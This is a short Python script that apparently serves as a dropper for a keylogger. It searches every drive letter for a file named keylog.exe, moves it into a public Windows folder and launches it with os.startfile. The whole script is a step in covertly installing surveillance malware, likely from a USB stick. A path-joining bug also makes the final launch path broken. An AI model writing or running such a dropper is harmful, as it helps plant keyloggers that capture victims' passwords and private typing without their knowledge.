import os.path, os
import shutil

#print(os.path.realpath(__file__))

save_path = 'C:/Users/Public/Public Downloads/Lan'
exe_path = ':/keylog/keylog.exe'

os.makedirs(save_path)

for i in range(26):
    try:
        shutil.move(chr(i + 65) + exe_path, save_path)
        break
    except:
        continue


new_exe_path = save_path+'keylog.exe'
os.startfile(new_exe_path)